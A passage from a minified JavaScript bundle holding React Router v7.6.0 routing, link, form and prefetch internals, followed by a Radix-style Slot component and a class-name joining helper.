            revalidation: r.revalidation || e.revalidation
        }
    }
    componentDidCatch(r, e) {
        console.error("React Router caught the following error during render", r, e)
    }
    render() {
        return this.state.error !== void 0 ? ue.createElement(Js.Provider, {
            value: this.props.routeContext
        }, ue.createElement(ZA.Provider, {
            value: this.state.error,
            children: this.props.component
        })) : this.props.children
    }
}
;
function Wz({routeContext: r, match: e, children: t}) {
    let o = ue.useContext(vu);
    return o && o.static && o.staticContext && (e.route.errorElement || e.route.ErrorBoundary) && (o.staticContext._deepestRenderedBoundaryId = e.route.id),
    ue.createElement(Js.Provider, {
        value: r
    }, t)
}
function Mz(r, e=[], t=null, o=null) {
    if (r == null) {
        if (!t)
            return null;
        if (t.errors)
            r = t.matches;
        else if (e.length === 0 && !t.initialized && t.matches.length > 0)
            r = t.matches;
        else
            return null
    }
    let i = r
      , n = t == null ? void 0 : t.errors;
    if (n != null) {
        let l = i.findIndex(f => f.route.id && (n == null ? void 0 : n[f.route.id]) !== void 0);
        er(l >= 0, `Could not find a matching route for errors on route IDs: ${Object.keys(n).join(",")}`),
        i = i.slice(0, Math.min(i.length, l + 1))
    }
    let s = !1
      , a = -1;
    if (t)
        for (let l = 0; l < i.length; l++) {
            let f = i[l];
            if ((f.route.HydrateFallback || f.route.hydrateFallbackElement) && (a = l),
            f.route.id) {
                let {loaderData: h, errors: p} = t
                  , b = f.route.loader && !h.hasOwnProperty(f.route.id) && (!p || p[f.route.id] === void 0);
                if (f.route.lazy || b) {
                    s = !0,
                    a >= 0 ? i = i.slice(0, a + 1) : i = [i[0]];
                    break
                }
            }
        }
    return i.reduceRight( (l, f, h) => {
        let p, b = !1, v = null, T = null;
        t && (p = n && f.route.id ? n[f.route.id] : void 0,
        v = f.route.errorElement || Oz,
        s && (a < 0 && h === 0 ? (p9("route-fallback", !1, "No `HydrateFallback` element provided to render during initial hydration"),
        b = !0,
        T = null) : a === h && (b = !0,
        T = f.route.hydrateFallbackElement || null)));
        let x = e.concat(i.slice(0, h + 1))
          , E = () => {
            let B;
            return p ? B = v : b ? B = T : f.route.Component ? B = ue.createElement(f.route.Component, null) : f.route.element ? B = f.route.element : B = l,
            ue.createElement(Wz, {
                match: f,
                routeContext: {
                    outlet: l,
                    matches: x,
                    isDataRoute: t != null
                },
                children: B
            })
        }
        ;
        return t && (f.route.ErrorBoundary || f.route.errorElement || h === 0) ? ue.createElement(Rz, {
            location: t.location,
            revalidation: t.revalidation,
            component: v,
            error: p,
            children: E(),
            routeContext: {
                outlet: null,
                matches: x,
                isDataRoute: !0
            }
        }) : E()
    }
    , null)
}
function YA(r) {
    return `${r} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`
}
function Nz(r) {
    let e = ue.useContext(vu);
    return er(e, YA(r)),
    e
}
function Dz(r) {
    let e = ue.useContext(u0);
    return er(e, YA(r)),
    e
}
function Fz(r) {
    let e = ue.useContext(Js);
    return er(e, YA(r)),
    e
}
function XA(r) {
    let e = Fz(r)
      , t = e.matches[e.matches.length - 1];
    return er(t.route.id, `${r} can only be used on routes that contain a unique "id"`),
    t.route.id
}
function Uz() {
    return XA("useRouteId")
}
function kz() {
    var o;
    let r = ue.useContext(ZA)
      , e = Dz("useRouteError")
      , t = XA("useRouteError");
    return r !== void 0 ? r : (o = e.errors) == null ? void 0 : o[t]
}
function Lz() {
    let {router: r} = Nz("useNavigate")
      , e = XA("useNavigate")
      , t = ue.useRef(!1);
    return h9( () => {
        t.current = !0
    }
    ),
    ue.useCallback(async (i, n={}) => {
        fn(t.current, d9),
        t.current && (typeof i == "number" ? r.navigate(i) : await r.navigate(i, {
            fromRouteId: e,
            ...n
        }))
    }
    , [r, e])
}
var jS = {};
function p9(r, e, t) {
    !e && !jS[r] && (jS[r] = !0,
    fn(!1, t))
}
var qS = {};
function VS(r, e) {
    !r && !qS[e] && (qS[e] = !0,
    console.warn(e))
}
function $z(r) {
    let e = {
        hasErrorBoundary: r.hasErrorBoundary || r.ErrorBoundary != null || r.errorElement != null
    };
    return r.Component && (r.element && fn(!1, "You should not include both `Component` and `element` on your route - `Component` will be used."),
    Object.assign(e, {
        element: ue.createElement(r.Component),
        Component: void 0
    })),
    r.HydrateFallback && (r.hydrateFallbackElement && fn(!1, "You should not include both `HydrateFallback` and `hydrateFallbackElement` on your route - `HydrateFallback` will be used."),
    Object.assign(e, {
        hydrateFallbackElement: ue.createElement(r.HydrateFallback),
        HydrateFallback: void 0
    })),
    r.ErrorBoundary && (r.errorElement && fn(!1, "You should not include both `ErrorBoundary` and `errorElement` on your route - `ErrorBoundary` will be used."),
    Object.assign(e, {
        errorElement: ue.createElement(r.ErrorBoundary),
        ErrorBoundary: void 0
    })),
    e
}
var zz = ["HydrateFallback", "hydrateFallbackElement"]
  , jz = class {
    constructor() {
        this.status = "pending",
        this.promise = new Promise( (r, e) => {
            this.resolve = t => {
                this.status === "pending" && (this.status = "resolved",
                r(t))
            }
            ,
            this.reject = t => {
                this.status === "pending" && (this.status = "rejected",
                e(t))
            }
        }
        )
    }
}
;
function qz({router: r, flushSync: e}) {
    let[t,o] = ue.useState(r.state)
      , [i,n] = ue.useState()
      , [s,a] = ue.useState({
        isTransitioning: !1
    })
      , [l,f] = ue.useState()
      , [h,p] = ue.useState()
      , [b,v] = ue.useState()
      , T = ue.useRef(new Map)
      , x = ue.useCallback( (O, {deletedFetchers: F, flushSync: D, viewTransitionOpts: I}) => {
        O.fetchers.forEach( (C, W) => {
            C.data !== void 0 && T.current.set(W, C.data)
        }
        ),
        F.forEach(C => T.current.delete(C)),
        VS(D === !1 || e != null, 'You provided the `flushSync` option to a router update, but you are not using the `<RouterProvider>` from `react-router/dom` so `ReactDOM.flushSync()` is unavailable.  Please update your app to `import { RouterProvider } from "react-router/dom"` and ensure you have `react-dom` installed as a dependency to use the `flushSync` option.');
        let M = r.window != null && r.window.document != null && typeof r.window.document.startViewTransition == "function";
        if (VS(I == null || M, "You provided the `viewTransition` option to a router update, but you do not appear to be running in a DOM environment as `window.startViewTransition` is not available."),
        !I || !M) {
            e && D ? e( () => o(O)) : ue.startTransition( () => o(O));
            return
        }
        if (e && D) {
            e( () => {
                h && (l && l.resolve(),
                h.skipTransition()),
                a({
                    isTransitioning: !0,
                    flushSync: !0,
                    currentLocation: I.currentLocation,
                    nextLocation: I.nextLocation
                })
            }
            );
            let C = r.window.document.startViewTransition( () => {
                e( () => o(O))
            }
            );
            C.finished.finally( () => {
                e( () => {
                    f(void 0),
                    p(void 0),
                    n(void 0),
                    a({
                        isTransitioning: !1
                    })
                }
                )
            }
            ),
            e( () => p(C));
            return
        }
        h ? (l && l.resolve(),
        h.skipTransition(),
        v({
            state: O,
            currentLocation: I.currentLocation,
            nextLocation: I.nextLocation
        })) : (n(O),
        a({
            isTransitioning: !0,
            flushSync: !1,
            currentLocation: I.currentLocation,
            nextLocation: I.nextLocation
        }))
    }
    , [r.window, e, h, l]);
    ue.useLayoutEffect( () => r.subscribe(x), [r, x]),
    ue.useEffect( () => {
        s.isTransitioning && !s.flushSync && f(new jz)
    }
    , [s]),
    ue.useEffect( () => {
        if (l && i && r.window) {
            let O = i
              , F = l.promise
              , D = r.window.document.startViewTransition(async () => {
                ue.startTransition( () => o(O)),
                await F
            }
            );
            D.finished.finally( () => {
                f(void 0),
                p(void 0),
                n(void 0),
                a({
                    isTransitioning: !1
                })
            }
            ),
            p(D)
        }
    }
    , [i, l, r.window]),
    ue.useEffect( () => {
        l && i && t.location.key === i.location.key && l.resolve()
    }
    , [l, h, t.location, i]),
    ue.useEffect( () => {
        !s.isTransitioning && b && (n(b.state),
        a({
            isTransitioning: !0,
            flushSync: !1,
            currentLocation: b.currentLocation,
            nextLocation: b.nextLocation
        }),
        v(void 0))
    }
    , [s.isTransitioning, b]);
    let E = ue.useMemo( () => ({
        createHref: r.createHref,
        encodeLocation: r.encodeLocation,
        go: O => r.navigate(O),
        push: (O, F, D) => r.navigate(O, {
            state: F,
            preventScrollReset: D == null ? void 0 : D.preventScrollReset
        }),
        replace: (O, F, D) => r.navigate(O, {
            replace: !0,
            state: F,
            preventScrollReset: D == null ? void 0 : D.preventScrollReset
        })
    }), [r])
      , B = r.basename || "/"
      , P = ue.useMemo( () => ({
        router: r,
        navigator: E,
        static: !1,
        basename: B
    }), [r, E, B]);
    return ue.createElement(ue.Fragment, null, ue.createElement(vu.Provider, {
        value: P
    }, ue.createElement(u0.Provider, {
        value: t
    }, ue.createElement(f9.Provider, {
        value: T.current
    }, ue.createElement(KA.Provider, {
        value: s
    }, ue.createElement(Kz, {
        basename: B,
        location: t.location,
        navigationType: t.historyAction,
        navigator: E
    }, ue.createElement(Vz, {
        routes: r.routes,
        future: r.future,
        state: t
    })))))), null)
}
var Vz = ue.memo(Hz);
function Hz({routes: r, future: e, state: t}) {
    return _z(r, void 0, t, e)
}
function Gz(r) {
    return Bz(r.context)
}
function Kz({basename: r="/", children: e=null, location: t, navigationType: o="POP", navigator: i, static: n=!1}) {
    er(!f0(), "You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");
    let s = r.replace(/^\/*/, "/")
      , a = ue.useMemo( () => ({
        basename: s,
        navigator: i,
        static: n,
        future: {}
    }), [s, i, n]);
    typeof t == "string" && (t = Yc(t));
    let {pathname: l="/", search: f="", hash: h="", state: p=null, key: b="default"} = t
      , v = ue.useMemo( () => {
        let T = Li(l, s);
        return T == null ? null : {
            location: {
                pathname: T,
                search: f,
                hash: h,
                state: p,
                key: b
            },
            navigationType: o
        }
    }
    , [s, l, f, h, p, b, o]);
    return fn(v != null, `<Router basename="${s}"> is not able to match the URL "${l}${f}${h}" because it does not start with the basename, so the <Router> won't render anything.`),
    v == null ? null : ue.createElement(Xs.Provider, {
        value: a
    }, ue.createElement(v1.Provider, {
        children: e,
        value: v
    }))
}
var gm = "get"
  , ym = "application/x-www-form-urlencoded";
function T1(r) {
    return r != null && typeof r.tagName == "string"
}
function Zz(r) {
    return T1(r) && r.tagName.toLowerCase() === "button"
}
function Yz(r) {
    return T1(r) && r.tagName.toLowerCase() === "form"
}
function Xz(r) {
    return T1(r) && r.tagName.toLowerCase() === "input"
}
function Jz(r) {
    return !!(r.metaKey || r.altKey || r.ctrlKey || r.shiftKey)
}
function Qz(r, e) {
    return r.button === 0 && (!e || e === "_self") && !Jz(r)
}
var Zg = null;
function ej() {
    if (Zg === null)
        try {
            new FormData(document.createElement("form"),0),
            Zg = !1
        } catch {
            Zg = !0
        }
    return Zg
}
var tj = new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
function Fv(r) {
    return r != null && !tj.has(r) ? (fn(!1, `"${r}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${ym}"`),
    null) : r
}
function rj(r, e) {
    let t, o, i, n, s;
    if (Yz(r)) {
        let a = r.getAttribute("action");
        o = a ? Li(a, e) : null,
        t = r.getAttribute("method") || gm,
        i = Fv(r.getAttribute("enctype")) || ym,
        n = new FormData(r)
    } else if (Zz(r) || Xz(r) && (r.type === "submit" || r.type === "image")) {
        let a = r.form;
        if (a == null)
            throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');
        let l = r.getAttribute("formaction") || a.getAttribute("action");
        if (o = l ? Li(l, e) : null,
        t = r.getAttribute("formmethod") || a.getAttribute("method") || gm,
        i = Fv(r.getAttribute("formenctype")) || Fv(a.getAttribute("enctype")) || ym,
        n = new FormData(a,r),
        !ej()) {
            let {name: f, type: h, value: p} = r;
            if (h === "image") {
                let b = f ? `${f}.` : "";
                n.append(`${b}x`, "0"),
                n.append(`${b}y`, "0")
            } else
                f && n.append(f, p)
        }
    } else {
        if (T1(r))
            throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');
        t = gm,
        o = null,
        i = ym,
        s = r
    }
    return n && i === "text/plain" && (s = n,
    n = void 0),
    {
        action: o,
        method: t.toLowerCase(),
        encType: i,
        formData: n,
        body: s
    }
}
function JA(r, e) {
    if (r === !1 || r === null || typeof r > "u")
        throw new Error(e)
}
async function nj(r, e) {
    if (r.id in e)
        return e[r.id];
    try {
        let t = await import(r.module);
        return e[r.id] = t,
        t
    } catch (t) {
        return console.error(`Error loading route module \`${r.module}\`, reloading page...`),
        console.error(t),
        window.__reactRouterContext && window.__reactRouterContext.isSpaMode,
        window.location.reload(),
        new Promise( () => {}
        )
    }
}
function oj(r) {
    return r == null ? !1 : r.href == null ? r.rel === "preload" && typeof r.imageSrcSet == "string" && typeof r.imageSizes == "string" : typeof r.rel == "string" && typeof r.href == "string"
}
async function ij(r, e, t) {
    let o = await Promise.all(r.map(async i => {
        let n = e.routes[i.route.id];
        if (n) {
            let s = await nj(n, t);
            return s.links ? s.links() : []
        }
        return []
    }
    ));
    return lj(o.flat(1).filter(oj).filter(i => i.rel === "stylesheet" || i.rel === "preload").map(i => i.rel === "stylesheet" ? {
        ...i,
        rel: "prefetch",
        as: "style"
    } : {
        ...i,
        rel: "prefetch"
    }))
}
function HS(r, e, t, o, i, n) {
    let s = (l, f) => t[f] ? l.route.id !== t[f].route.id : !0
      , a = (l, f) => {
        var h;
        return t[f].pathname !== l.pathname || ((h = t[f].route.path) == null ? void 0 : h.endsWith("*")) && t[f].params["*"] !== l.params["*"]
    }
    ;
    return n === "assets" ? e.filter( (l, f) => s(l, f) || a(l, f)) : n === "data" ? e.filter( (l, f) => {
        var p;
        let h = o.routes[l.route.id];
        if (!h || !h.hasLoader)
            return !1;
        if (s(l, f) || a(l, f))
            return !0;
        if (l.route.shouldRevalidate) {
            let b = l.route.shouldRevalidate({
                currentUrl: new URL(i.pathname + i.search + i.hash,window.origin),
                currentParams: ((p = t[0]) == null ? void 0 : p.params) || {},
                nextUrl: new URL(r,window.origin),
                nextParams: l.params,
                defaultShouldRevalidate: !0
            });
            if (typeof b == "boolean")
                return b
        }
        return !0
    }
    ) : []
}
function sj(r, e, {includeHydrateFallback: t}={}) {
    return aj(r.map(o => {
        let i = e.routes[o.route.id];
        if (!i)
            return [];
        let n = [i.module];
        return i.clientActionModule && (n = n.concat(i.clientActionModule)),
        i.clientLoaderModule && (n = n.concat(i.clientLoaderModule)),
        t && i.hydrateFallbackModule && (n = n.concat(i.hydrateFallbackModule)),
        i.imports && (n = n.concat(i.imports)),
        n
    }
    ).flat(1))
}
function aj(r) {
    return [...new Set(r)]
}
function cj(r) {
    let e = {}
      , t = Object.keys(r).sort();
    for (let o of t)
        e[o] = r[o];
    return e
}
function lj(r, e) {
    let t = new Set;
    return new Set(e),
    r.reduce( (o, i) => {
        let n = JSON.stringify(cj(i));
        return t.has(n) || (t.add(n),
        o.push({
            key: n,
            link: i
        })),
        o
    }
    , [])
}
Object.getOwnPropertyNames(Object.prototype).sort().join("\0");
var uj = new Set([100, 101, 204, 205]);
function fj(r, e) {
    let t = typeof r == "string" ? new URL(r,typeof window > "u" ? "server://singlefetch/" : window.location.origin) : r;
    return t.pathname === "/" ? t.pathname = "_root.data" : e && Li(t.pathname, e) === "/" ? t.pathname = `${e.replace(/\/$/, "")}/_root.data` : t.pathname = `${t.pathname.replace(/\/$/, "")}.data`,
    t
}
function g9() {
    let r = ue.useContext(vu);
    return JA(r, "You must render this element inside a <DataRouterContext.Provider> element"),
    r
}
function dj() {
    let r = ue.useContext(u0);
    return JA(r, "You must render this element inside a <DataRouterStateContext.Provider> element"),
    r
}
var QA = ue.createContext(void 0);
QA.displayName = "FrameworkContext";
function y9() {
    let r = ue.useContext(QA);
    return JA(r, "You must render this element inside a <HydratedRouter> element"),
    r
}
function hj(r, e) {
    let t = ue.useContext(QA)
      , [o,i] = ue.useState(!1)
      , [n,s] = ue.useState(!1)
      , {onFocus: a, onBlur: l, onMouseEnter: f, onMouseLeave: h, onTouchStart: p} = e
      , b = ue.useRef(null);
    ue.useEffect( () => {
        if (r === "render" && s(!0),
        r === "viewport") {
            let x = B => {
                B.forEach(P => {
                    s(P.isIntersecting)
                }
                )
            }
              , E = new IntersectionObserver(x,{
                threshold: .5
            });
            return b.current && E.observe(b.current),
            () => {
                E.disconnect()
            }
        }
    }
    , [r]),
    ue.useEffect( () => {
        if (o) {
            let x = setTimeout( () => {
                s(!0)
            }
            , 100);
            return () => {
                clearTimeout(x)
            }
        }
    }
    , [o]);
    let v = () => {
        i(!0)
    }
      , T = () => {
        i(!1),
        s(!1)
    }
    ;
    return t ? r !== "intent" ? [n, b, {}] : [n, b, {
        onFocus: ip(a, v),
        onBlur: ip(l, T),
        onMouseEnter: ip(f, v),
        onMouseLeave: ip(h, T),
        onTouchStart: ip(p, v)
    }] : [!1, b, {}]
}
function ip(r, e) {
    return t => {
        r && r(t),
        t.defaultPrevented || e(t)
    }
}
function pj({page: r, ...e}) {
    let {router: t} = g9()
      , o = ue.useMemo( () => Mc(t.routes, r, t.basename), [t.routes, r, t.basename]);
    return o ? ue.createElement(yj, {
        page: r,
        matches: o,
        ...e
    }) : null
}
function gj(r) {
    let {manifest: e, routeModules: t} = y9()
      , [o,i] = ue.useState([]);
    return ue.useEffect( () => {
        let n = !1;
        return ij(r, e, t).then(s => {
            n || i(s)
        }
        ),
        () => {
            n = !0
        }
    }
    , [r, e, t]),
    o
}
function yj({page: r, matches: e, ...t}) {
    let o = Tu()
      , {manifest: i, routeModules: n} = y9()
      , {basename: s} = g9()
      , {loaderData: a, matches: l} = dj()
      , f = ue.useMemo( () => HS(r, e, l, i, o, "data"), [r, e, l, i, o])
      , h = ue.useMemo( () => HS(r, e, l, i, o, "assets"), [r, e, l, i, o])
      , p = ue.useMemo( () => {
        if (r === o.pathname + o.search + o.hash)
            return [];
        let T = new Set
          , x = !1;
        if (e.forEach(B => {
            var O;
            let P = i.routes[B.route.id];
            !P || !P.hasLoader || (!f.some(F => F.route.id === B.route.id) && B.route.id in a && ((O = n[B.route.id]) != null && O.shouldRevalidate) || P.hasClientLoader ? x = !0 : T.add(B.route.id))
        }
        ),
        T.size === 0)
            return [];
        let E = fj(r, s);
        return x && T.size > 0 && E.searchParams.set("_routes", e.filter(B => T.has(B.route.id)).map(B => B.route.id).join(",")),
        [E.pathname + E.search]
    }
    , [s, a, o, i, f, e, r, n])
      , b = ue.useMemo( () => sj(h, i), [h, i])
      , v = gj(h);
    return ue.createElement(ue.Fragment, null, p.map(T => ue.createElement("link", {
        key: T,
        rel: "prefetch",
        as: "fetch",
        href: T,
        ...t
    })), b.map(T => ue.createElement("link", {
        key: T,
        rel: "modulepreload",
        href: T,
        ...t
    })), v.map( ({key: T, link: x}) => ue.createElement("link", {
        key: T,
        ...x
    })))
}
function bj(...r) {
    return e => {
        r.forEach(t => {
            typeof t == "function" ? t(e) : t != null && (t.current = e)
        }
        )
    }
}
var b9 = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u";
try {
    b9 && (window.__reactRouterVersion = "7.6.0")
} catch {}
function mj(r, e) {
    return oz({
        basename: e == null ? void 0 : e.basename,
        unstable_getContext: e == null ? void 0 : e.unstable_getContext,
        future: e == null ? void 0 : e.future,
        history: P$({
            window: e == null ? void 0 : e.window
        }),
        hydrationData: xj(),
        routes: r,
        mapRouteProperties: $z,
        hydrationRouteProperties: zz,
        dataStrategy: e == null ? void 0 : e.dataStrategy,
        patchRoutesOnNavigation: e == null ? void 0 : e.patchRoutesOnNavigation,
        window: e == null ? void 0 : e.window
    }).initialize()
}
function xj() {
    let r = window == null ? void 0 : window.__staticRouterHydrationData;
    return r && r.errors && (r = {
        ...r,
        errors: wj(r.errors)
    }),
    r
}
function wj(r) {
    if (!r)
        return null;
    let e = Object.entries(r)
      , t = {};
    for (let[o,i] of e)
        if (i && i.__type === "RouteErrorResponse")
            t[o] = new qm(i.status,i.statusText,i.data,i.internal === !0);
        else if (i && i.__type === "Error") {
            if (i.__subType) {
                let n = window[i.__subType];
                if (typeof n == "function")
                    try {
                        let s = new n(i.message);
                        s.stack = "",
                        t[o] = s
                    } catch {}
            }
            if (t[o] == null) {
                let n = new Error(i.message);
                n.stack = "",
                t[o] = n
            }
        } else
            t[o] = i;
    return t
}
var m9 = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
  , e3 = ue.forwardRef(function({onClick: e, discover: t="render", prefetch: o="none", relative: i, reloadDocument: n, replace: s, state: a, target: l, to: f, preventScrollReset: h, viewTransition: p, ...b}, v) {
    let {basename: T} = ue.useContext(Xs), x = typeof f == "string" && m9.test(f), E, B = !1;
    if (typeof f == "string" && x && (E = f,
    b9))
        try {
            let W = new URL(window.location.href)
              , k = f.startsWith("//") ? new URL(W.protocol + f) : new URL(f)
              , H = Li(k.pathname, T);
            k.origin === W.origin && H != null ? f = H + k.search + k.hash : B = !0
        } catch {
            fn(!1, `<Link to="${f}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)
        }
    let P = Az(f, {
        relative: i
    })
      , [O,F,D] = hj(o, b)
      , I = Aj(f, {
        replace: s,
        state: a,
        target: l,
        preventScrollReset: h,
        relative: i,
        viewTransition: p
    });
    function M(W) {
        e && e(W),
        W.defaultPrevented || I(W)
    }
    let C = ue.createElement("a", {
        ...b,
        ...D,
        href: E || P,
        onClick: B || n ? e : M,
        ref: bj(v, F),
        target: l,
        "data-discover": !x && t === "render" ? "true" : void 0
    });
    return O && !x ? ue.createElement(ue.Fragment, null, C, ue.createElement(pj, {
        page: P
    })) : C
});
e3.displayName = "Link";
var vj = ue.forwardRef(function({"aria-current": e="page", caseSensitive: t=!1, className: o="", end: i=!1, style: n, to: s, viewTransition: a, children: l, ...f}, h) {
    let p = d0(s, {
        relative: f.relative
    })
      , b = Tu()
      , v = ue.useContext(u0)
      , {navigator: T, basename: x} = ue.useContext(Xs)
      , E = v != null && _j(p) && a === !0
      , B = T.encodeLocation ? T.encodeLocation(p).pathname : p.pathname
      , P = b.pathname
      , O = v && v.navigation && v.navigation.location ? v.navigation.location.pathname : null;
    t || (P = P.toLowerCase(),
    O = O ? O.toLowerCase() : null,
    B = B.toLowerCase()),
    O && x && (O = Li(O, x) || O);
    const F = B !== "/" && B.endsWith("/") ? B.length - 1 : B.length;
    let D = P === B || !i && P.startsWith(B) && P.charAt(F) === "/", I = O != null && (O === B || !i && O.startsWith(B) && O.charAt(B.length) === "/"), M = {
        isActive: D,
        isPending: I,
        isTransitioning: E
    }, C = D ? e : void 0, W;
    typeof o == "function" ? W = o(M) : W = [o, D ? "active" : null, I ? "pending" : null, E ? "transitioning" : null].filter(Boolean).join(" ");
    let k = typeof n == "function" ? n(M) : n;
    return ue.createElement(e3, {
        ...f,
        "aria-current": C,
        className: W,
        ref: h,
        style: k,
        to: s,
        viewTransition: a
    }, typeof l == "function" ? l(M) : l)
});
vj.displayName = "NavLink";
var Tj = ue.forwardRef( ({discover: r="render", fetcherKey: e, navigate: t, reloadDocument: o, replace: i, state: n, method: s=gm, action: a, onSubmit: l, relative: f, preventScrollReset: h, viewTransition: p, ...b}, v) => {
    let T = Sj()
      , x = Bj(a, {
        relative: f
    })
      , E = s.toLowerCase() === "get" ? "get" : "post"
      , B = typeof a == "string" && m9.test(a)
      , P = O => {
        if (l && l(O),
        O.defaultPrevented)
            return;
        O.preventDefault();
        let F = O.nativeEvent.submitter
          , D = (F == null ? void 0 : F.getAttribute("formmethod")) || s;
        T(F || O.currentTarget, {
            fetcherKey: e,
            method: D,
            navigate: t,
            replace: i,
            state: n,
            relative: f,
            preventScrollReset: h,
            viewTransition: p
        })
    }
    ;
    return ue.createElement("form", {
        ref: v,
        method: E,
        action: x,
        onSubmit: o ? l : P,
        ...b,
        "data-discover": !B && r === "render" ? "true" : void 0
    })
}
);
Tj.displayName = "Form";
function Ej(r) {
    return `${r} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`
}
function x9(r) {
    let e = ue.useContext(vu);
    return er(e, Ej(r)),
    e
}
function Aj(r, {target: e, replace: t, state: o, preventScrollReset: i, relative: n, viewTransition: s}={}) {
    let a = Pz()
      , l = Tu()
      , f = d0(r, {
        relative: n
    });
    return ue.useCallback(h => {
        if (Qz(h, e)) {
            h.preventDefault();
            let p = t !== void 0 ? t : jc(l) === jc(f);
            a(r, {
                replace: p,
                state: o,
                preventScrollReset: i,
                relative: n,
                viewTransition: s
            })
        }
    }
    , [l, a, f, t, o, e, r, i, n, s])
}
var Pj = 0
  , Cj = () => `__${String(++Pj)}__`;
function Sj() {
    let {router: r} = x9("useSubmit")
      , {basename: e} = ue.useContext(Xs)
      , t = Uz();
    return ue.useCallback(async (o, i={}) => {
        let {action: n, method: s, encType: a, formData: l, body: f} = rj(o, e);
        if (i.navigate === !1) {
            let h = i.fetcherKey || Cj();
            await r.fetch(h, t, i.action || n, {
                preventScrollReset: i.preventScrollReset,
                formData: l,
                body: f,
                formMethod: i.method || s,
                formEncType: i.encType || a,
                flushSync: i.flushSync
            })
        } else
            await r.navigate(i.action || n, {
                preventScrollReset: i.preventScrollReset,
                formData: l,
                body: f,
                formMethod: i.method || s,
                formEncType: i.encType || a,
                replace: i.replace,
                state: i.state,
                fromRouteId: t,
                flushSync: i.flushSync,
                viewTransition: i.viewTransition
            })
    }
    , [r, e, t])
}
function Bj(r, {relative: e}={}) {
    let {basename: t} = ue.useContext(Xs)
      , o = ue.useContext(Js);
    er(o, "useFormAction must be used inside a RouteContext");
    let[i] = o.matches.slice(-1)
      , n = {
        ...d0(r || ".", {
            relative: e
        })
    }
      , s = Tu();
    if (r == null) {
        n.search = s.search;
        let a = new URLSearchParams(n.search)
          , l = a.getAll("index");
        if (l.some(h => h === "")) {
            a.delete("index"),
            l.filter(p => p).forEach(p => a.append("index", p));
            let h = a.toString();
            n.search = h ? `?${h}` : ""
        }
    }
    return (!r || r === ".") && i.route.index && (n.search = n.search ? n.search.replace(/^\?/, "?index&") : "?index"),
    t !== "/" && (n.pathname = n.pathname === "/" ? t : Hs([t, n.pathname])),
    jc(n)
}
function _j(r, e={}) {
    let t = ue.useContext(KA);
    er(t != null, "`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");
    let {basename: o} = x9("useViewTransitionState")
      , i = d0(r, {
        relative: e.relative
    });
    if (!t.isTransitioning)
        return !1;
    let n = Li(t.currentLocation.pathname, o) || t.currentLocation.pathname
      , s = Li(t.nextLocation.pathname, o) || t.nextLocation.pathname;
    return jm(i.pathname, s) != null || jm(i.pathname, n) != null
}
[...uj];
var Ij = KW();
/**
 * react-router v7.6.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */
function Oj(r) {
    return ue.createElement(qz, {
        flushSync: Ij.flushSync,
        ...r
    })
}
function GS(r, e) {
    if (typeof r == "function")
        return r(e);
    r != null && (r.current = e)
}
function w9(...r) {
    return e => {
        let t = !1;
        const o = r.map(i => {
            const n = GS(i, e);
            return !t && typeof n == "function" && (t = !0),
            n
        }
        );
        if (t)
            return () => {
                for (let i = 0; i < o.length; i++) {
                    const n = o[i];
                    typeof n == "function" ? n() : GS(r[i], null)
                }
            }
    }
}
function Lp(...r) {
    return ue.useCallback(w9(...r), r)
}
function Hm(r) {
    const e = Wj(r)
      , t = ue.forwardRef( (o, i) => {
        const {children: n, ...s} = o
          , a = ue.Children.toArray(n)
          , l = a.find(Nj);
        if (l) {
            const f = l.props.children
              , h = a.map(p => p === l ? ue.Children.count(f) > 1 ? ue.Children.only(null) : ue.isValidElement(f) ? f.props.children : null : p);
            return L.jsx(e, {
                ...s,
                ref: i,
                children: ue.isValidElement(f) ? ue.cloneElement(f, void 0, h) : null
            })
        }
        return L.jsx(e, {
            ...s,
            ref: i,
            children: n
        })
    }
    );
    return t.displayName = `${r}.Slot`,
    t
}
var Rj = Hm("Slot");
function Wj(r) {
    const e = ue.forwardRef( (t, o) => {
        const {children: i, ...n} = t;
        if (ue.isValidElement(i)) {
            const s = Fj(i)
              , a = Dj(n, i.props);
            return i.type !== ue.Fragment && (a.ref = o ? w9(o, s) : s),
            ue.cloneElement(i, a)
        }
        return ue.Children.count(i) > 1 ? ue.Children.only(null) : null
    }
    );
    return e.displayName = `${r}.SlotClone`,
    e
}
var Mj = Symbol("radix.slottable");
function Nj(r) {
    return ue.isValidElement(r) && typeof r.type == "function" && "__radixId"in r.type && r.type.__radixId === Mj
}
function Dj(r, e) {
    const t = {
        ...e
    };
    for (const o in e) {
        const i = r[o]
          , n = e[o];
        /^on[A-Z]/.test(o) ? i && n ? t[o] = (...a) => {
            const l = n(...a);
            return i(...a),
            l
        }
        : i && (t[o] = i) : o === "style" ? t[o] = {
            ...i,
            ...n
        } : o === "className" && (t[o] = [i, n].filter(Boolean).join(" "))
    }
    return {
        ...r,
        ...t
    }
}
function Fj(r) {
    var o, i;
    let e = (o = Object.getOwnPropertyDescriptor(r.props, "ref")) == null ? void 0 : o.get
      , t = e && "isReactWarning"in e && e.isReactWarning;
    return t ? r.ref : (e = (i = Object.getOwnPropertyDescriptor(r, "ref")) == null ? void 0 : i.get,
    t = e && "isReactWarning"in e && e.isReactWarning,
    t ? r.props.ref : r.props.ref || r.ref)
}
function v9(r) {
    var e, t, o = "";
    if (typeof r == "string" || typeof r == "number")
        o += r;
    else if (typeof r == "object")
        if (Array.isArray(r)) {
            var i = r.length;
            for (e = 0; e < i; e++)
                r[e] && (t = v9(r[e])) && (o && (o += " "),
                o += t)
        } else
            for (t in r)
                r[t] && (o && (o += " "),
                o += t);
    return o
}
function T9() {
    for (var r, e, t = 0, o = "", i = arguments.length; t < i; t++)
        (r = arguments[t]) && (e = v9(r)) && (o && (o += " "),
        o += e);
    return o
}
const KS = r => typeof r == "boolean" ? `${r}` : r === 0 ? "0" : r
  , ZS = T9
  , Uj = (r, e) => t => {
    var o;
